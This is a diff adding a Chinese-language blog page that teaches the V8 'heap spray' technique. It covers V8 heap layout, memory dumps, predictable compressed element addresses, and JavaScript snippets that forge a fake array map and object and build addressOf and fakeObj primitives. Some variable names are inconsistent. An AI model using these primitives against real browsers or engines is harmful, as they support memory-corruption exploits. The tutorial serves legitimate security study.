@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <link rel="alternate icon" type="image/png" href="/img/favicon.png">
+    <title>Loora1N&#39;s Blog | 鹭雨 | </title>
+    
+<link rel="stylesheet" href="/css/reset.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/css/markdown.css">
+
+    
+<link rel="stylesheet" href="/css/fonts.css">
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+    <body>
+        <div class="paper">
+            <div class="paper-main">
+                
+                    <div class="post-header">
+    <a class="logo" href="/">Loora1N&#39;s Blog | 鹭雨</a>
+    <a class="go-home" href="/">
+        <svg width="8" height="14" viewBox="0 0 8 14">
+            <path d="M7 1L1 7l6 6" stroke="#000" stroke-width="2" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+    </a>
+</div>
+                
+                <div class="post-main">
+
+    
+    
+        <div class="post-main-title">
+            【V8】V8利用手法-HeapSpary
+        </div>
+        <div class="post-meta">
+            2024-09-20
+        </div>
+        <div class="post-md">
+            <blockquote>
+<p>本文讲解V8中的<strong>HeapSpary</strong>也就是常说的“堆喷”手法的基本原理和思想。后续会写一篇复现CVE-2021-38001的文章，讲解实际<strong>HeapSpary</strong>的利用和效果。</p>
+</blockquote>
+<h2 id="V8中的堆结构"><a href="#V8中的堆结构" class="headerlink" title="V8中的堆结构"></a>V8中的堆结构</h2><blockquote>
+<p>图源：<a target="_blank" rel="noopener" href="https://deepu.tech/memory-management-in-v8/">https://deepu.tech/memory-management-in-v8/</a></p>
+</blockquote>
+<p>首先，我们需要对V8中的堆结构有个基本认识。V8内存结构总体如下所示</p>
+<p><img src="/img/article/v8-5/kSgatSL.png" alt="kSgatSL"></p>
+<p>从图中可以看到，整个堆区域总体可以分为几个小区域：</p>
+<ul>
+<li><strong>New space(Young generation)</strong></li>
+<li><strong>Old space(Old generation)</strong></li>
+<li><strong>Large object space</strong></li>
+<li><strong>Code-space</strong></li>
+<li><strong>Cell space, propertity, and map space</strong></li>
+</ul>
+<blockquote>
+<p>我们在V8中所说的“堆”与平时glibc等等所谈到的“堆”有所区别，两者只是功能相近，都是表达用来动态管理内存的一整套机制。但V8中的内存分配，并不依赖于glibc的堆块管理，我们在下文中vmmap的部分也能注意到，<strong>两者并不指向同一个虚拟地址范围</strong>。或者说，V8中的“堆”比glibc的“堆”更加靠近表层，主要依照解析的JS代码来进行分配操作，而glibc在这里的堆则是决定<strong>d8自身在运行时所用到的动态分配的内存</strong>。</p>
+</blockquote>
+<p>使用<code>vmmap</code>，我们可以找到其V8对应的堆区域大致在下图红框范围：</p>
+<p><img src="/img/article/v8-5/image-20240919162453479.png" alt="image-20240919162453479"></p>
+<p>其中<code>0x331e08240000     0x331f00000000 ---p f7dc0000      0 [anon_331e08240]</code>这一部分表示尚未分配的内存区域。为了方便观察结构，我们可以new一个较大的Array，使其从0x331e08240000这里进行新的分割，而不是从其他区域选择之前废弃的堆块。如下代码，我们分配一个0x8000的Array</p>
+<pre><code class="javascript">a = Array(0x8000);
+%DebugPrint(a);
+%SystemBreak();
+</code></pre>
+<p>对比两者<code>vmmap</code>结果，可以注意到红线这里的确新分割出了一片区域，区域Size从<strong>0x80000</strong>增长至<strong>0xa3000</strong></p>
+<p><img src="/img/article/v8-5/image-20240919164440374.png" alt="image-20240919164440374"></p>
+<p>我们直接查看多出来区域的内容也就是<code>0x28ce081c0000+0x80000</code>如下</p>
+<pre><code class="sh">pwndbg&gt; x/20gx 0x28ce081c0000 + 0x80000
+0x28ce08240000: 0x0000000000023000      0x0000000000000032
+0x28ce08240010: 0x0000561bce413c58      0x000028ce08242118
+0x28ce08240020: 0x000028ce08262120      0x0000000000020008
+0x28ce08240030: 0x0000000000000000      0x0000000000002118
+0x28ce08240040: 0x0000561bce496b40      0x0000561bce405ca0
+0x28ce08240050: 0x000028ce08240000      0x0000000000023000
+0x28ce08240060: 0x0000000000000000      0x0000000000000000
+0x28ce08240070: 0x0000000000000000      0x0000000000000000
+0x28ce08240080: 0x0000000000000000      0x0000000000000000
+0x28ce08240090: 0x0000000000000000      0x0000000000000000
+</code></pre>
+<p>通过阅读其他的文章以及一些自己的猜测，我们基本能判断出部分偏移处的含义:</p>
+<ul>
+<li>**0x0: **表示整个结构的大小为0x23000，经过多次测试，新分割的块似乎以0x1000进行对齐</li>
+<li>**0x18: **已有数据块内容的起始地址</li>
+<li>**0x20: **空闲区域的起始地址</li>
+<li>**0x28: **已有数据块的大小<code>0x20008 = 0x8000 * 4 + 0x8 = 0x000028ce08262120 - 0x000028ce08242118</code></li>
+<li>**0x28: **结构头的大小0x2118</li>
+</ul>
+<blockquote>
+<p>如果不太熟悉V8的对象结构，可能会疑惑为什么数据块大小额外要加0x8，这里的0x8其实就是elements结构的前两个部分：<strong>32 bit map addr</strong>和<strong>32 bit length</strong>，之后紧接着的就是实际存储的数据了。具体可以看我之前的文章：<a href="https://loora1n.github.io/2024/07/25/%E3%80%90V8%E3%80%91%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE%E7%A0%94%E7%A9%B6/">V8通用利用链研究</a></p>
+</blockquote>
+<p> 从<code>DebugPrint</code>的输出，我们也能确定数据的起始地址为<code>0x28ce08242119 - 1</code></p>
+<pre><code class="sh">DebugPrint: 0x28ce08049941: [JSArray]
+...
+ - elements: 0x28ce08242119 &lt;FixedArray[32768]&gt; &#123;
+     0-32767: 0x28ce0800242d &lt;the_hole&gt;
+ &#125;
+ ...
+</code></pre>
+<h2 id="堆喷的基本思想"><a href="#堆喷的基本思想" class="headerlink" title="堆喷的基本思想"></a>堆喷的基本思想</h2><h3 id="获取堆地址"><a href="#获取堆地址" class="headerlink" title="获取堆地址"></a>获取堆地址</h3><p>在上述我们可以继续扩大下Array的大小，使其以0x40000对齐，<code>(0x40000 -0x3000) / 4 = 0xF400</code>。计算得到可以更改Array大小为0xF400进行测试</p>
+<blockquote>
+<p>其中0x3000由0x2118以0x1000对齐可得，4是指向空元素<code>the_hole</code>的压缩指针长度</p>
+</blockquote>
+<pre><code class="javascript">a = Array(0xF400);
+%DebugPrint(a);
+%SystemBreak();
+</code></pre>
+<p>查看结构</p>
+<pre><code class="sh">pwndbg&gt; x/20gx 0x411081c0000 + 0x80000
+0x41108240000:  0x0000000000040000      0x0000000000000032
+0x41108240010:  0x00005575eaef8c58      0x0000041108242118
+0x41108240020:  0x000004110827f120      0x000000000003d008
+0x41108240030:  0x0000000000000000      0x0000000000002118
+0x41108240040:  0x00005575eaf7bb40      0x00005575eaeeaca0
+0x41108240050:  0x0000041108240000      0x0000000000040000
+0x41108240060:  0x0000000000000000      0x0000000000000000
+0x41108240070:  0x0000000000000000      0x0000000000000000
+0x41108240080:  0x0000000000000000      0x0000000000000000
+0x41108240090:  0x0000000000000000      0x0000000000000000
+</code></pre>
+<p>可以注意到分割的大小确实是0x40000。另外，由于现在分割块以0x40000对齐，从而保证了低两字节的块起始地址恒为0x0000。导致数据的起始地址变为低两字节恒为<code>0x2118</code>，也就是分割块的头部大小。同时我们观察Debug输出，也能注意到<code>elements</code>的地址第两位为<code>0x2119 = 0x2118 + 1</code>。</p>
+<pre><code class="sh"># 这里的地址和前面的高位并不一样，是因为我又重新跑了一边，之前的结果忘记复制了😂，反正关注点主要在后4字节
+
+DebugPrint: 0x28fa08049941: [JSArray]
+ - map: 0x28fa08203ab9 &lt;Map(HOLEY_SMI_ELEMENTS)&gt; [FastProperties]
+ - prototype: 0x28fa081cc0e9 &lt;JSArray[0]&gt;
+ - elements: 0x28fa08242119 &lt;FixedArray[62464]&gt; [HOLEY_SMI_ELEMENTS]
+ - length: 62464
+ - properties: 0x28fa0800222d &lt;FixedArray[0]&gt;
+ - All own properties (excluding elements): &#123;
+    0x28fa080048f1: [String] in ReadOnlySpace: #length: 0x28fa0814215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor
+ &#125;
+ - elements: 0x28fa08242119 &lt;FixedArray[62464]&gt; &#123;
+     0-62463: 0x28fa0800242d &lt;the_hole&gt;
+ &#125;
+</code></pre>
+<p>我们又知V8中地址的存储经常使用指针压缩的方式，所以只需关注低32位即可。</p>
+<blockquote>
+<p>指针压缩详细内容可以看看这篇文章：<a target="_blank" rel="noopener" href="https://v8.js.cn/blog/pointer-compression/">https://v8.js.cn/blog/pointer-compression/</a></p>
+<p>起始只需关注下压缩指针和解压指针的代码就很清楚了</p>
+<pre><code class="c">/***	压缩	***/
+uint64_t uncompressed_tagged;
+uint32_t compressed_tagged = uint32_t(uncompressed_tagged);
+
+/***	解压	***/
+uint32_t compressed_tagged;
+
+uint64_t uncompressed_tagged;
+if (compressed_tagged &amp; 1) &#123;
+  // pointer case
+  uncompressed_tagged = base + uint64_t(compressed_tagged);
+&#125; else &#123;
+  // Smi case
+  uncompressed_tagged = int64_t(compressed_tagged);
+&#125;
+</code></pre>
+</blockquote>
+<p>在多次运行后，我们可以注意到另一个有趣的现象，下面是几次<code>elements</code>的不同结果</p>
+<pre><code>- elements: 0x28fa08242119
+- elements: 0x29cb08242119
+- elements: 0x1e5e08242119
+- elements: 0x24ee08242119
+...
+</code></pre>
+<p>可以很容易注意到，不仅仅低16bit完全相同，整个低32位都是完全相同的，也就是说<code>elements</code>对应的压缩地址是完全固定的，因而我们可以通过合理划分块来获得<code>elements</code>的地址。</p>
+<blockquote>
+<p>这里的地址固定，是因为整个堆区域的起始，都是从0x00000000开始(低32bit)，且整个空间区域地址连续，从之前的vmmap图我们也能观察到这点。因此在JS脚本不变的情况下，堆区域的分配基本只受到d8版本的影响，从而使得堆喷的成功率大大提高。</p>
+</blockquote>
+<h3 id="伪造对象"><a href="#伪造对象" class="headerlink" title="伪造对象"></a>伪造对象</h3><p>通过上述的内容，我们清楚了用堆喷来泄露可控堆地址的基本思想，在此基础上，我们可以考虑在堆上伪造对象结构，比如这里我们可以尝试伪造一个<strong>存储Double类型数据的JSArray对象</strong>。</p>
+<p>首先需要伪造JSArray对应的<code>array_map</code>对象</p>
+<pre><code class="js">elemetns_addr = 0x08282119
+
+double_array_map_value0 = itof(0x1604040408002119n);
+double_array_map_value1 = itof(0x0a0007ff15000834n);
+
+a[0x1000/0x8] = double_array_map_value0;
+a[0x1008/0x8] = double_array_map_value1;
+
+array_map_addr = elemetns_addr + 0x1000 + 0x8;
+</code></pre>
+<blockquote>
+<p>在map结构中这里的value0和value1也基本是固定值，应该直接找个结构复制出来即可，在js对象进行读写时，并不检查完整的map结构，而是根据这里的特征值来判断元素类型。</p>
+</blockquote>
+<p>然后伪造JSArray主体部分</p>
+<pre><code class="js">fake_elements = elemetns_addr + 0x2000;
+
+a[0x0/0x8] = u2d(double_array_map_addr, 0); //map, prototype
+a[0x8/0x8] = u2d(fake_elements, 0x2); //elements, length
+
+fake_array_obj_addr = elements_addr + 0x8;
+</code></pre>
+<p>上述便是伪造一个结构的基本流程，了解了这个过程后，addressOf和fakeObject也会变得更加容易实现。另外，针对<strong>obj类型的Array map值</strong>用gdb动调复制得到如下</p>
+<pre><code class="js">obj_array_map_value0 = itof(0x1604040408002119n);
+obj_array_map_value1 = itof(0x0a0007ff15000834n);
+</code></pre>
+<h3 id="addressOf-amp-fakeObj"><a href="#addressOf-amp-fakeObj" class="headerlink" title="addressOf &amp; fakeObj"></a>addressOf &amp; fakeObj</h3><p>那么，我们可以写出<code>addressOf</code>和<code>fakeObj</code>函数的大致框架，其中evil代表我们在堆中伪造的Array对象</p>
+<pre><code class="js">function addressOf(obj)
+&#123;
+    a[0x0/0x8] = u2d(obj_array_map_addr + 1, 0);
+    evil[0] = obj;
+    a[0x0/0x8] = u2d(double_array_map_addr + 1, 0);
+    let addr = ftoi(evil[0]) - 1;
+    console.log(&quot;[*] address of obj is: 0x&quot; + hex(addr));
+    return addr;
+&#125;
+</code></pre>
+<p><code>fakeObj</code>部分如下</p>
+<pre><code class="js">function fakeObj(addr)
+&#123;
+    a[0x0/0x8] = u2d(double_array_map + 1,0);
+    evil[0] = itof(addr+1n);
+    a[0x0/0x8] = u2d(obj_array_map_addr + 1, 0);
+    let obj = evil[0];
+    return obj;
+&#125;
+</code></pre>
+<p>总体来看，堆喷和对象伪造省去了我们在正常利用流程中泄露map地址的部分，我们可以更轻易的获取<strong>obj array和double array的map</strong>.</p>
+<blockquote>
+<p>下一篇文章将以CVE-2021-38001为例，讲解实际堆喷的利用</p>
+</blockquote>
+
+        </div>
+
+    
+
+</div>
+                <div class="footer">
+    <span>Copyright © 2022 Loora1N&#39;s Blog | 鹭雨</span>
+    <span>Theme Designed By <a target="_blank" href="https://zheli.design/one-paper">這李設計</a></span>
+</div>
+
+
+<link rel="stylesheet" href="/css/a11y-dark.min.css">
+
+
+<script src="/js/highlight.min.js"></script>
+
+
+<script src="/js/highlightjs-line-numbers.js"></script>
+
+
+<script>
+    hljs.initHighlightingOnLoad();
+    hljs.initLineNumbersOnLoad();
+</script>
+
+            </div>
+        </div>
+    <!-- hexo injector body_end start -->
+  <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
+  <script data-pjax>
+        function GithubCalendarConfig(){
+            var git_githubapiurl ="https://python-github-calendar-api.vercel.app/api?Loora1N";
+            var git_color =['#ebedf0', '#fdcdec', '#fc9bd9', '#fa6ac5', '#f838b2', '#f5089f', '#c4067e', '#92055e', '#540336', '#48022f', '#30021f'];
+            var git_user ="Loora1N";
+            var parent_div_git = document.getElementById('recent-posts');
+            var git_div_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><div id="github_loading" style="width:10%;height:100%;margin:0 auto;display: block"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animateTransform></path></svg></div><div id="github_container"></div></div>';
+            if(parent_div_git && location.pathname =='/about/'){
+                console.log('已挂载github calendar')
+                // parent_div_git.innerHTML=git_div_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
+                parent_div_git.insertAdjacentHTML("afterbegin",git_div_html) // 有报错，但不影响使用(支持pjax跳转)
+            };
+            GithubCalendar(git_githubapiurl,git_color,git_user)
+        }
+        if(document.getElementById('recent-posts')){
+            GithubCalendarConfig()
+        }
+    </script>
+    <style>#github_container{min-height:280px}@media screen and (max-width:650px) {#github_container{background-image:;min-height:0px}}</style>
+    <style></style><!-- hexo injector body_end end --></body>
+</html>
